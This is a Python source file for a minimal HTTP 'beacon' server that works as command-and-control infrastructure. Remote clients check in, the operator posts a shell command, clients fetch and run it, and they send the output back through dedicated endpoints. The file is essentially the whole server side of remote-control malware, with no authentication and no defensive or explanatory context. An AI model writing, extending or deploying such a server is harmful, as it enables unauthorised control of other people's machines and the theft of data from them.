import threading
import time
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

clients = []
command = ""
command_result = ""
class MyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/status':
            if self.client_address[0] not in clients:
                clients.append(self.client_address[0])
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK')
        
        elif self.path == '/command':
            global command
            length = int(self.headers['Content-Length'])
            command = self.rfile.read(length).decode()
            print('Received command: ', command)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        
        elif self.path == '/post_result':
            global command_result
            length = int(self.headers['Content-Length'])
            result = self.rfile.read(length).decode()
            command_result = result
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        else:
            self.send_error(404)
    
    def do_GET(self):
        if self.path == '/clients':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(json.dumps(clients).encode())
        
        elif self.path == '/get_command':
            global command
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(command.encode())
        
        elif self.path == '/get_result':
            global command_result
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(command_result.encode())
        else:
            self.send_error(404)

def update_clients(stop_event):
    global clients
    while not stop_event.is_set():
        time.sleep(1)
def clear_clients(stop_event):
    global clients
    while not stop_event.is_set():
        time.sleep(60)
        clients = []

def main():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, MyHandler)
    print('Beacon activated.')
    stop_event = threading.Event()
    update_thread = threading.Thread(target=update_clients, args=(stop_event,))
    clear_thread = threading.Thread(target=clear_clients, args=(stop_event,))
    clear_thread.start()
    update_thread.start()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('Killing beacon...')
    stop_event.set()
    update_thread.join() 

if __name__ == '__main__':
    main()
